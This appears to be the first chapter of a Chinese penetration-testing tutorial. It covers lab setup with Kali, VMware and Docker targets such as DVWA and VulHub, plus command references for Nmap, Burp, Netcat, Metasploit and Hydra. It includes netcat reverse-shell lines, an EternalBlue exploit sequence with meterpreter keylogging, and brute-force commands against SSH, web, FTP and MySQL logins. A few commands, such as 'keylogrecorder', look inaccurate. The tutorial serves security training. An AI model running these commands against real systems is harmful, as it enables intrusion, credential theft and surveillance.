# Chapter 1: 环境搭建

## 1.1 安装渗透测试平台

### 1.1.1 VMWare

VMWare 是一个虚拟化平台，允许用户在单个物理机器上运行多个操作系统。

**安装步骤：**
1. 从官方网站下载 VMWare 安装包
2. 运行安装包并按照提示安装
3. 接受许可协议并选择安装位置
4. 选择安装类型（典型或自定义）
5. 完成安装

**创建虚拟机：**
1. 启动 VMWare → 创建新虚拟机
2. 选择虚拟机类型（Windows/Linux）
3. 选择操作系统和架构（32位/64位）
4. 分配资源（CPU、内存、磁盘空间）
5. 选择网络设置（桥接、NAT、主机only）
6. 创建虚拟硬盘
7. 安装操作系统

### 1.1.2 Kali Linux

Kali Linux 是基于 Linux 的渗透测试操作系统。

**安装步骤：**
1. 下载 Kali Linux VMware 镜像
2. 在 VMware 中导入镜像（.vmx 文件）
3. 启动 Kali Linux
   - 默认用户名：`kali`
   - 默认密码：`kali`
4. 配置网络、虚拟硬件、共享文件夹

**更新 Kali：**
```bash
sudo apt update && sudo apt upgrade -y
```

## 1.2 渗透测试工具集

### 1.2.1 Nmap - 端口扫描

**安装：**
```bash
# Kali 已预装
# Ubuntu/Debian
sudo apt install nmap
```

**常用命令：**

| 命令 | 说明 |
|------|------|
| `nmap 192.168.1.1` | 扫描单个主机 |
| `nmap 192.168.1.1-254` | 扫描网段 |
| `nmap -p 1-1000 192.168.1.1` | 指定端口扫描 |
| `nmap -sV 192.168.1.1` | 版本检测 |
| `nmap -O 192.168.1.1` | 操作系统检测 |
| `nmap -sS 192.168.1.1` | SYN 扫描 |
| `nmap -sU 192.168.1.1` | UDP 扫描 |
| `nmap -A 192.168.1.1` | 全面扫描 |
| `nmap -oX output.xml 192.168.1.1` | XML 输出 |

**扫描脚本：**
```bash
# 漏洞扫描
nmap --script vuln 192.168.1.1

# 暴力破解
nmap --script brute 192.168.1.1

# SQL 注入检测
nmap --script sql-injection 192.168.1.1
```

### 1.2.2 Burp Suite - Web 渗透测试

**安装：**
```bash
# 下载地址：https://portswigger.net/burp/
# Kali 已预装: burpsuite
```

**常用功能：**

1. **Proxy（代理）**
   - 拦截 HTTP/HTTPS 请求
   - 修改请求参数
   - 重放请求 (Repeater)

2. **Spider（爬虫）**
   - 自动发现网站结构
   - 抓取页面链接

3. **Scanner（扫描器）**
   - 自动发现漏洞
   - 生成漏洞报告

4. **Intruder（入侵者）**
   - 暴力破解
   - 参数 fuzzing

5. **Repeater（重放）**
   - 修改并重放请求

**设置代理：**
```
浏览器 → Proxy → Options → Proxy Listeners
127.0.0.1:8080
```

### 1.2.3 Netcat - 网络瑞士军刀

**安装：**
```bash
# Kali 已预装
# Ubuntu/Debian
sudo apt install netcat-openbsd
```

**常用命令：**

| 命令 | 说明 |
|------|------|
| `nc -nv 192.168.1.1 80` | 连接远程端口 |
| `nc -lvp 4444` | 监听端口 |
| `nc -e /bin/bash 192.168.1.1 4444` | 反向 Shell |
| `nc 192.168.1.1 4444` | 正向连接 |
| `nc -zvn 192.168.1.1 1-1000` | 端口扫描 |
| `nc -nvlp 5555 < file` | 传输文件 |
| `nc -n 192.168.1.1 5555 > file` | 接收文件 |

**实战案例：**

```bash
# 目标机（监听）
nc -lvp 4444

# 攻击机（连接）
nc 目标IP 4444

# 传输 Shell
nc -e /bin/bash 攻击机IP 4444
```

### 1.2.4 Metasploit - 漏洞利用框架

**安装：**
```bash
# Kali 已预装
msfconsole
```

**基本使用：**

```bash
# 搜索漏洞
search exploit name

# 使用漏洞
use exploit/windows/smb/ms17_010_eternalblue

# 设置参数
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100
set LPORT 4444

# 攻击
exploit

# 后渗透
meterpreter > sysinfo
meterpreter > screenshot
meterpreter > keylogrecorder
```

### 1.2.5 Hydra - 暴力破解

**安装：**
```bash
# Kali 已预装
sudo apt install hydra
```

**常用命令：**

```bash
# SSH 暴力破解
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh

# HTTP POST 登录
hydra -L users.txt -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP
hydra -L users.txt -P passwords.txt 192.168.1.1 ftp

# MySQL
hydra -l root -P passwords.txt 192.168.1.1 mysql
```

## 1.3 安装 Docker 环境

### Docker 基本用法

| 功能 | 命令 |
|------|------|
| 运行容器 | `docker run -it ubuntu /bin/bash` |
| 列出容器 | `docker ps -a` |
| 停止容器 | `docker stop <container_id>` |
| 删除容器 | `docker rm <container_id>` |
| 创建镜像 | `docker build -t myimage .` |
| 拉取镜像 | `docker pull myimage` |
| 进入容器 | `docker exec -it container /bin/bash` |
| 查看日志 | `docker logs -f container` |

## 1.4 搭建漏洞环境

### 1.4.1 Metasploitable2

基于 Linux 的渗透测试环境，包含多种常见漏洞。

**下载地址：** https://github.com/rapid7/metasploitable2

### 1.4.2 DVWA (Damn Vulnerable Web Application)

**Docker 搭建：**
```bash
docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa
# 访问 http://localhost:8080
# 默认用户名/密码: admin/admin
```

### 1.4.3 SQLI-LABS

SQL 注入练习平台。

**Docker 搭建：**
```bash
docker pull acgpiano/sqli-labs
docker run -d -p 8081:80 --name sqli-labs acgpiano/sqli-labs
# 访问 http://localhost:8081
```

### 1.4.4 Upload-Labs

文件上传漏洞练习平台。

**Docker 搭建：**
```bash
docker pull c0ny1/upload-labs
docker run -d -p 8082:80 --name upload-labs c0ny1/upload-labs
# 访问 http://localhost:8082
```

### 1.4.5 VulHub - 漏洞环境集合

```bash
# 安装 VulHub
git clone https://github.com/vulhub/vulhub.git

# 启动漏洞环境
cd vulhub/weblogic/CVE-2017-10271
docker-compose up -d
```

## 靶场端口汇总

| 靶场 | 端口 |
|------|------|
| DVWA | 8080 |
| SQLI-LABS | 8081 |
| Upload-Labs | 8082 |
| Metasploitable2 | 随机 |
| VulHub | 视环境而定 |

## 常用靶场推荐

| 靶场 | 类型 | 地址 |
|------|------|------|
| HackTheBox | 在线渗透测试 | hackthebox.eu |
| TryHackMe | 在线渗透测试 | tryhackme.com |
| PentesterLab | 在线练习 | pentesterlab.com |
| DVWA | 本地 Web 漏洞 | docker |
| VulHub | 本地漏洞环境 | docker |
